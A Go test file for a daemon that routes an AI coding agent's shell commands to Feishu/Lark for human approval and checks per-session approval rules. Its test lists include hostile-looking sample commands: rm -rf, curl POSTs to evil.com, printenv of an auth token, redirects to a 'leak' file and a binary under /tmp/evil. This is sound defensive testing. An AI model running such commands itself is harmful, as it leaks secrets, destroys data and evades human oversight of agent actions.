package daemon

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"posse/internal/agent"
	"posse/internal/errtext"
	"posse/internal/lark"
	"posse/internal/store"
)

type stubPermWatcher struct {
	reqCh      chan PermRequest
	resolvedCh chan string
}

func (w *stubPermWatcher) WatchPermission(req PermRequest) bool {
	w.reqCh <- req
	return true
}

func (w *stubPermWatcher) PermissionResolved(reqID, behavior, source string) {
	w.resolvedCh <- reqID + ":" + behavior + ":" + source
}

// 验证 Antigravity PreToolUse 经共享 permissionHub 挂起并由飞书决策放行/拒绝，且解析 toolCall 负载。
func TestPermissionHubAntigravityPreToolUse(t *testing.T) {
	var hub permissionHub
	hub.timeout = 5 * time.Second
	w := &stubPermWatcher{reqCh: make(chan PermRequest, 1), resolvedCh: make(chan string, 1)}
	hub.SetWatcher(w)

	payload := json.RawMessage(`{"toolCall":{"id":"call_1","name":"run_command","args":{"CommandLine":"tail -n 200 /var/log/app.log"}}}`)
	done := make(chan string, 1)
	go func() {
		done <- hub.Hold(context.Background(), "t_agy", "antigravity", payload, nil, nil)
	}()

	req := <-w.reqCh
	if req.Tool != "run_command" || req.Summary != "tail -n 200 /var/log/app.log" || req.Agent != "antigravity" {
		t.Fatalf("unexpected parsed agy perm request: %+v", req)
	}
	if !hub.Decide(req.ID, "allow", "feishu") {
		t.Fatal("Decide returned false")
	}
	if got := <-done; got != "allow" {
		t.Fatalf("expected allow, got %q", got)
	}
	if res := <-w.resolvedCh; res != req.ID+":allow:feishu" {
		t.Fatalf("unexpected resolved event: %q", res)
	}

	// 测试「本会话允许同类」：非解释器命令记住后第二次不再弹出飞书卡片，但不同命令或拼接危险命令仍会拦截
	p1 := json.RawMessage(`{"toolCall":{"id":"call_2","name":"run_command","args":{"CommandLine":"go test ./internal/cli"}}}`)
	done2 := make(chan string, 1)
	go func() {
		done2 <- hub.Hold(context.Background(), "t_agy", "antigravity", p1, nil, nil)
	}()
	req2 := <-w.reqCh
	if req2.RuleLabel != "go test" {
		t.Fatalf("expected rule label go test, got %q", req2.RuleLabel)
	}
	if !hub.Decide(req2.ID, "allow_session", "feishu") {
		t.Fatal("Decide allow_session returned false")
	}
	if got := <-done2; got != "allow" {
		t.Fatalf("expected allow, got %q", got)
	}
	if res := <-w.resolvedCh; res != req2.ID+":allow:feishu:session" {
		t.Fatalf("unexpected session resolved event: %q", res)
	}

	// 同会话再次调用 go test：直接秒放行，不触发 WatchPermission
	p2 := json.RawMessage(`{"toolCall":{"id":"call_3","name":"run_command","args":{"CommandLine":"go test ./internal/agent"}}}`)
	if got := hub.Hold(context.Background(), "t_agy", "antigravity", p2, nil, nil); got != "allow" {
		t.Fatalf("expected session-allowed go test to bypass prompt, got %q", got)
	}
	select {
	case extra := <-w.reqCh:
		t.Fatalf("session-allowed call should not trigger WatchPermission, got %+v", extra)
	default:
	}

	// 复合命令带未放行的 rm：必须依然弹窗拦截
	pBad := json.RawMessage(`{"toolCall":{"id":"call_4","name":"run_command","args":{"CommandLine":"go test ./internal/cli && rm -rf /tmp/x"}}}`)
	doneBad := make(chan string, 1)
	go func() {
		doneBad <- hub.Hold(context.Background(), "t_agy", "antigravity", pBad, nil, nil)
	}()
	reqBad := <-w.reqCh
	hub.Decide(reqBad.ID, "deny", "feishu")
	if got := <-doneBad; got != "deny" {
		t.Fatalf("expected compound unsafe command to require approval and deny, got %q", got)
	}
	<-w.resolvedCh
}

// 验证规则键生成会跳过已被只读白名单放行的命令段，且对重定向、无法解析命令、两级 posse 与越界输出目的地严格收敛。
func TestDeriveCommandRuleKeysSkipsReadOnly(t *testing.T) {
	keys, label := deriveCommandRuleKeys("cd /tmp/x && lark-cli base +foo-update --base-token EHz --as user ; ls")
	if len(keys) != 1 || keys[0] != "cmd:lark-cli base +foo-update" || label != "lark-cli base +foo-update" {
		t.Fatalf("unexpected rule keys=%v label=%q", keys, label)
	}

	// 支持「空白 + \ + LF」续行，且只读前缀/后缀被跳过
	keys2, label2 := deriveCommandRuleKeys("mkdir -p /tmp/x && cd /tmp/x && \\\nlark-cli base +foo-update \\\n  --base-token EHz --as user | jq .")
	if len(keys2) != 1 || keys2[0] != "cmd:lark-cli base +foo-update" || label2 != "lark-cli base +foo-update" {
		t.Fatalf("unexpected multiline rule keys=%v label=%q", keys2, label2)
	}

	// posse 记两级（posse <组> <动作>），不同二级动作不会共享规则键
	posseSendKeys, posseSendLabel := deriveCommandRuleKeys("posse task send k_1 hi")
	if len(posseSendKeys) != 1 || posseSendKeys[0] != "cmd:posse task send" || posseSendLabel != "posse task send" {
		t.Fatalf("unexpected posse send rule keys=%v label=%q", posseSendKeys, posseSendLabel)
	}
	posseCloseKeys, posseCloseLabel := deriveCommandRuleKeys("posse --json task close k_1")
	if len(posseCloseKeys) != 1 || posseCloseKeys[0] != "cmd:posse task close" || posseCloseLabel != "posse task close" {
		t.Fatalf("unexpected posse close rule keys=%v label=%q", posseCloseKeys, posseCloseLabel)
	}

	// 全部段均安全时返回空规则键
	keys3, label3 := deriveCommandRuleKeys("cd /tmp/x && ls -la | head -n 10")
	if len(keys3) != 0 || label3 != "" {
		t.Fatalf("all-safe command should produce no rule keys, got keys=%v label=%q", keys3, label3)
	}

	// 需审批段带任何重定向、程序以带 / 的绝对/相对路径给出、无法可靠解析（含 glob/花括号/未允许或未引号变量）、
	// 前置环境变量或指向非安全/隐式输出目的地时，整条命令不生成同类规则键（只能单次允许）
	noRuleCases := []string{
		"/tmp/x/git status",
		"/tmp/x/git commit -m test",
		"/usr/bin/python3 /tmp/a.py",
		"./python3 /tmp/a.py",
		"cd /tmp/a && ./run.sh",
		"cd /tmp/b && ./run.sh",
		"echo hi > /Users/x/a",
		"python3 /tmp/a.py > /Users/x/out.txt",
		"cd /tmp/x && lark-cli base +foo-update --as user 2>&1",
		"echo hi | tee /etc/hosts",
		"lark-cli base +record-download-attachment --base-token EHz --table-id tbl --record-id r1 --output /Users/x/a --as user",
		"lark-cli base +record-download-attachment --base-token EHz --table-id tbl --record-id r1 --as user",
		"lark-cli drive +export --token doc1 --doc-type docx --file-extension pdf",
		"lark-cli im +messages-mget --message-ids om_1 --download-resources=true --as bot",
		"FOO=bar python3 /tmp/a.py",
		"python3 /tmp/a.py # comment",
		"python3 '/tmp/unclosed",
		"python3 /tmp/a.py \\\r\n  --flag",
		"python3 /tmp/*.py",
		"python3 /tmp/{a,b}.py",
		"lark-cli base +foo-update --record-id {1..3} --as user",
		"python3 $HOME",
		"python3 $SECRET_SCRIPT",
	}
	for _, cmd := range noRuleCases {
		if ks, lbl := deriveCommandRuleKeys(cmd); len(ks) != 0 || lbl != "" {
			t.Errorf("expected no session rule key for %q, got keys=%v label=%q", cmd, ks, lbl)
		}
	}

	// 验证「本会话允许同类」：
	// 1. 前后缀只读段变化时仍命中同类
	// 2. 同程序换不同输出目的地（带重定向）不能复用已授权规则，必须再次审批
	// 3. 未授权写段混入已授权复合命令必须再次审批
	var hub permissionHub
	hub.timeout = 5 * time.Second
	w := &stubPermWatcher{reqCh: make(chan PermRequest, 1), resolvedCh: make(chan string, 1)}
	hub.SetWatcher(w)

	p1 := json.RawMessage(`{"toolCall":{"id":"call_10","name":"run_command","args":{"CommandLine":"cd /tmp/a && lark-cli base +foo-update --record-id r1 --as user"}}}`)
	done := make(chan string, 1)
	go func() {
		done <- hub.Hold(context.Background(), "t_rule", "antigravity", p1, nil, nil)
	}()
	req := <-w.reqCh
	if len(req.RuleKeys) != 1 || req.RuleKeys[0] != "cmd:lark-cli base +foo-update" {
		t.Fatalf("unexpected req rule keys: %+v", req.RuleKeys)
	}
	hub.Decide(req.ID, "allow_session", "feishu")
	if got := <-done; got != "allow" {
		t.Fatalf("expected allow, got %q", got)
	}
	<-w.resolvedCh

	p2 := json.RawMessage(`{"toolCall":{"id":"call_11","name":"run_command","args":{"CommandLine":"mkdir -p /tmp/b && cd /tmp/b && lark-cli base +foo-update --record-id r2 --as user | jq ."}}}`)
	if got := hub.Hold(context.Background(), "t_rule", "antigravity", p2, nil, nil); got != "allow" {
		t.Fatalf("expected session-allowed rule to match regardless of safe prefix/suffix, got %q", got)
	}

	// 带路径的同名程序不生成同类规则键，且不能命中裸命令的本会话同类规则
	pDiffPath := json.RawMessage(`{"toolCall":{"id":"call_11b","name":"run_command","args":{"CommandLine":"/tmp/evil/lark-cli base +foo-update --record-id r2 --as user"}}}`)
	doneDiff := make(chan string, 1)
	go func() {
		doneDiff <- hub.Hold(context.Background(), "t_rule", "antigravity", pDiffPath, nil, nil)
	}()
	reqDiff := <-w.reqCh
	if len(reqDiff.RuleKeys) != 0 {
		t.Fatalf("path-qualified command should not produce rule keys, got %+v", reqDiff.RuleKeys)
	}
	hub.Decide(reqDiff.ID, "deny", "feishu")
	if got := <-doneDiff; got != "deny" {
		t.Fatalf("expected deny for path-qualified same-basename command, got %q", got)
	}
	<-w.resolvedCh

	// 同程序带输出重定向到不同目的地：必须重新审批且无同类规则键
	pRedir := json.RawMessage(`{"toolCall":{"id":"call_12","name":"run_command","args":{"CommandLine":"lark-cli base +foo-update --record-id r2 --as user > /Users/x/leak.txt"}}}`)
	doneRedir := make(chan string, 1)
	go func() {
		doneRedir <- hub.Hold(context.Background(), "t_rule", "antigravity", pRedir, nil, nil)
	}()
	reqRedir := <-w.reqCh
	if len(reqRedir.RuleKeys) != 0 {
		t.Fatalf("redirected write command should not produce rule keys, got %+v", reqRedir.RuleKeys)
	}
	hub.Decide(reqRedir.ID, "deny", "feishu")
	if got := <-doneRedir; got != "deny" {
		t.Fatalf("expected deny for redirected write command, got %q", got)
	}
	<-w.resolvedCh

	// 未授权写段混入已授权复合命令：必须重新审批
	pMixed := json.RawMessage(`{"toolCall":{"id":"call_13","name":"run_command","args":{"CommandLine":"cd /tmp/b && lark-cli base +foo-update --record-id r2 --as user && posse task close k_1"}}}`)
	doneMixed := make(chan string, 1)
	go func() {
		doneMixed <- hub.Hold(context.Background(), "t_rule", "antigravity", pMixed, nil, nil)
	}()
	reqMixed := <-w.reqCh
	if len(reqMixed.RuleKeys) != 2 || reqMixed.RuleKeys[0] != "cmd:lark-cli base +foo-update" || reqMixed.RuleKeys[1] != "cmd:posse task close" {
		t.Fatalf("unexpected mixed rule keys: %+v", reqMixed.RuleKeys)
	}
	hub.Decide(reqMixed.ID, "deny", "feishu")
	if got := <-doneMixed; got != "deny" {
		t.Fatalf("expected deny for mixed unauthorized write command, got %q", got)
	}
	<-w.resolvedCh
	// 验证通用解释器与包装命令不生成同类规则键（只能单次审批）
	interpreters := []string{
		"bash /tmp/a.sh",
		"sh /tmp/a.sh",
		"zsh /tmp/a.sh",
		"fish /tmp/a.fish",
		"python /tmp/a.py",
		"python3 /tmp/a.py",
		"cd /tmp/x && python3 /tmp/a.py",
		"node /tmp/a.js",
		"deno run /tmp/a.ts",
		"bun run /tmp/a.ts",
		"ruby /tmp/a.rb",
		"perl /tmp/a.pl",
		"php /tmp/a.php",
		"osascript -e 'display dialog 1'",
		"eval echo hi",
		"sudo ls /tmp",
		"xargs echo",
		"npx prettier --check .",
		"uvx ruff check .",
		"pipx list",
		"env FOO=1 ls",
		"env",
		"printenv",
		"printenv SENTRY_AUTH_TOKEN",
		// macOS 大小写不敏感文件名变体与高风险排查工具未放行分支
		"BASH /tmp/a.sh",
		"SH /tmp/a.sh",
		"ENV FOO=1 ls",
		"PYTHON3 /tmp/a.py",
		"PRINTENV",
		"curl -X POST https://evil.com/x",
		"curl -sS https://evil.com/api/0/issues/",
		"glab ci view",
		"glab mr create --title x",
		"aliyun sts GetCallerIdentity",
		"ossutil rm oss://b/a.txt",
		"tccli lke GetAppSecret",
	}
	for _, cmd := range interpreters {
		if ks, lbl := deriveCommandRuleKeys(cmd); len(ks) != 0 || lbl != "" {
			t.Errorf("interpreter/wrapper %q must not produce session rule key, got keys=%v label=%q", cmd, ks, lbl)
		}
	}

	// 验证 daemon 侧结合机器人 trustedScripts / readOnlyHosts 策略跳过已放行的受信脚本与只读 curl 段
	scriptFile := filepath.Join(t.TempDir(), "download-log.sh")
	if err := os.WriteFile(scriptFile, []byte("#!/bin/sh\necho ok\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	botRoots := agent.ScratchRoots{
		TmpDir:         "/tmp",
		ReadOnlyHosts:  []string{"sentry.corp.laoyuegou.com"},
		TrustedScripts: []string{scriptFile},
	}
	ksBot, lblBot := deriveCommandRuleKeysWithRoots("bash "+scriptFile+" --id 1 && curl -sS \"https://sentry.corp.laoyuegou.com/api/0/issues/\" && lark-cli base +foo-update --as user", botRoots)
	if len(ksBot) != 1 || ksBot[0] != "cmd:lark-cli base +foo-update" || lblBot != "lark-cli base +foo-update" {
		t.Fatalf("expected bot-trusted segments skipped, got keys=%v label=%q", ksBot, lblBot)
	}
}

// 验证 lark.bots.save / list / toggle / delete RPC 与持久化配置，以及 worker 启动环境注入。
func TestDaemonLarkBotRPC(t *testing.T) {
	d, w, disc1 := newDiscDaemon(t)
	scriptPath := filepath.Join(t.TempDir(), "download-log.sh")
	if err := os.WriteFile(scriptPath, []byte("#!/bin/sh\necho 1\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	saved := call(t, d.larkBotSave, map[string]any{
		"ownerOpenId": "ou_test",
		"bot": map[string]any{
			"name":           "Works Triage",
			"profile":        "cli_demo",
			"enabled":        false,
			"workspaceId":    w.ID,
			"agent":          "antigravity",
			"permissionMode": "ask",
			"sessionMode":    "chat",
			"triggerPolicy":  "self",
			"readOnlyHosts":  []string{"Sentry.Corp.Laoyuegou.com"},
			"trustedScripts": []string{scriptPath},
		},
	}).(lark.BotConfig)
	if saved.ID == "" || saved.Name != "Works Triage" || saved.Agent != "antigravity" {
		t.Fatalf("unexpected saved bot: %+v", saved)
	}
	if len(saved.ReadOnlyHosts) != 1 || saved.ReadOnlyHosts[0] != "sentry.corp.laoyuegou.com" {
		t.Fatalf("unexpected ReadOnlyHosts: %+v", saved.ReadOnlyHosts)
	}
	if len(saved.TrustedScripts) != 1 || saved.TrustedScripts[0] != scriptPath {
		t.Fatalf("unexpected TrustedScripts: %+v", saved.TrustedScripts)
	}

	// 验证 larkBotSave 校验非法 readOnlyHosts / trustedScripts 并可经 errtext 译成中文
	badHostRaw, _ := json.Marshal(map[string]any{
		"bot": map[string]any{
			"profile":       "cli_bad",
			"readOnlyHosts": []string{"https://evil.com/x"},
		},
	})
	_, badHostErr := d.larkBotSave(context.Background(), badHostRaw)
	if badHostErr == nil || !strings.Contains(errtext.TextIn(errtext.ZH, badHostErr), "只读白名单域名无效") {
		t.Fatalf("expected translated bad host error, got %v", badHostErr)
	}
	badScriptRaw, _ := json.Marshal(map[string]any{
		"bot": map[string]any{
			"profile":        "cli_bad",
			"trustedScripts": []string{"relative/bad.sh"},
		},
	})
	_, badScriptErr := d.larkBotSave(context.Background(), badScriptRaw)
	if badScriptErr == nil || !strings.Contains(errtext.TextIn(errtext.ZH, badScriptErr), "受信脚本路径无效") {
		t.Fatalf("expected translated bad script error, got %v", badScriptErr)
	}

	// 验证 larkLaunchOptions 注入 POSSE_LARK_APPROVAL / POSSE_LARK_BOT_ID / POSSE_LARK_TRUSTED_SCRIPTS / POSSE_LARK_READONLY_HOSTS
	if err := d.store.SaveLarkBinding(store.LarkBinding{
		BotID:          saved.ID,
		ChatID:         "oc_1",
		ThreadKey:      "",
		DiscussionKey:  disc1.Key,
		PermissionMode: lark.PermAsk,
		Active:         true,
	}); err != nil {
		t.Fatal(err)
	}
	permMode, extApproval, extraEnv := d.larkLaunchOptions(disc1.Key)
	if permMode != agent.PermissionAsk || !extApproval {
		t.Fatalf("unexpected launch options: perm=%q ext=%v", permMode, extApproval)
	}
	envText := strings.Join(extraEnv, "\n")
	if !strings.Contains(envText, "POSSE_LARK_APPROVAL=1") ||
		!strings.Contains(envText, "POSSE_LARK_BOT_ID="+saved.ID) ||
		!strings.Contains(envText, "POSSE_LARK_TRUSTED_SCRIPTS="+scriptPath) ||
		!strings.Contains(envText, "POSSE_LARK_READONLY_HOSTS=sentry.corp.laoyuegou.com") {
		t.Fatalf("missing injected lark env: %+v", extraEnv)
	}

	// 验证双机器人策略隔离、larkStop 不清空 rootsResolver 以及清空策略后即时生效
	scriptPath2 := filepath.Join(t.TempDir(), "bot2.sh")
	if err := os.WriteFile(scriptPath2, []byte("#!/bin/sh\necho 2\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	w2 := store.Workspace{ID: store.NewID("w_"), ProjectID: w.ProjectID, Name: "bot2", Path: t.TempDir(), Kind: "folder", CreatedAt: time.Now()}
	if err := d.store.AddWorkspace(w2); err != nil {
		t.Fatal(err)
	}
	saved2 := call(t, d.larkBotSave, map[string]any{
		"bot": map[string]any{
			"name":           "Bot 2",
			"profile":        "cli_demo_2",
			"enabled":        false,
			"workspaceId":    w2.ID,
			"readOnlyHosts":  []string{"gitlab.corp.laoyuegou.com"},
			"trustedScripts": []string{scriptPath2},
		},
	}).(lark.BotConfig)
	disc2 := call(t, d.discCreate, map[string]any{"title": "bot2", "workspace": w2.ID}).(store.Discussion)
	if err := d.store.SaveLarkBinding(store.LarkBinding{
		BotID:          saved2.ID,
		ChatID:         "oc_2",
		ThreadKey:      "",
		DiscussionKey:  disc2.Key,
		PermissionMode: lark.PermAsk,
		Active:         true,
	}); err != nil {
		t.Fatal(err)
	}
	m1 := addMember(t, d, disc1, "m1", "claude")
	m2 := addMember(t, d, disc2, "m2", "claude")
	r1 := postTo(t, d, disc1, "hi bot1", m1.ID, "c_b1")
	r2 := postTo(t, d, disc2, "hi bot2", m2.ID, "c_b2")
	x1 := waitExec(t, d, r1.Execution.ID, store.ExecRunning)
	x2 := waitExec(t, d, r2.Execution.ID, store.ExecRunning)
	termBot1 := x1.Worker
	termBot2 := x2.Worker

	d.perms.SetRootsResolver(d.larkReadOnlyRoots)
	d.larkStop() // 停止网关不应清空 rootsResolver

	roots1 := d.perms.rootsForTerminal(termBot1)
	roots2 := d.perms.rootsForTerminal(termBot2)
	ks1, _ := deriveCommandRuleKeysWithRoots("bash "+scriptPath+" && lark-cli base +foo-update --as user", roots1)
	if len(ks1) != 1 || ks1[0] != "cmd:lark-cli base +foo-update" {
		t.Fatalf("bot 1 should skip its own trusted script, got %v", ks1)
	}
	if ksCross, _ := deriveCommandRuleKeysWithRoots("bash "+scriptPath+" && lark-cli base +foo-update --as user", roots2); len(ksCross) != 0 {
		t.Fatalf("bot 2 must NOT trust bot 1 script (bash segment should cancel rule keys), got %v", ksCross)
	}
	// 清空 bot 1 策略后，daemon resolver 立即撤销放行
	call(t, d.larkBotSave, map[string]any{
		"bot": map[string]any{
			"id":          saved.ID,
			"name":        saved.Name,
			"profile":     saved.Profile,
			"workspaceId": w.ID,
		},
	})
	roots1Cleared := d.perms.rootsForTerminal(termBot1)
	if len(roots1Cleared.ReadOnlyHosts) != 0 || len(roots1Cleared.TrustedScripts) != 0 {
		t.Fatalf("expected cleared roots for bot 1, got %+v", roots1Cleared)
	}
	if ksRevoked, _ := deriveCommandRuleKeysWithRoots("bash "+scriptPath+" && lark-cli base +foo-update --as user", roots1Cleared); len(ksRevoked) != 0 {
		t.Fatalf("bot 1 cleared policy must revoke script trust immediately, got %v", ksRevoked)
	}
	call(t, d.larkBotDelete, map[string]any{"id": saved2.ID})

	toggled := call(t, d.larkBotToggle, map[string]any{"id": saved.ID, "enabled": true}).(lark.BotConfig)
	if !toggled.Enabled {
		t.Fatal("expected bot enabled")
	}
	listed := call(t, d.larkBotsList, map[string]any{}).(map[string]any)
	if listed["ownerOpenId"] != "ou_test" {
		t.Fatalf("unexpected ownerOpenId: %+v", listed)
	}
	call(t, d.larkBotDelete, map[string]any{"id": saved.ID})
	cfg, err := lark.LoadConfig(d.cfg.Home)
	if err != nil || len(cfg.Bots) != 0 {
		t.Fatalf("expected empty bots after delete, got %+v err=%v", cfg.Bots, err)
	}
}
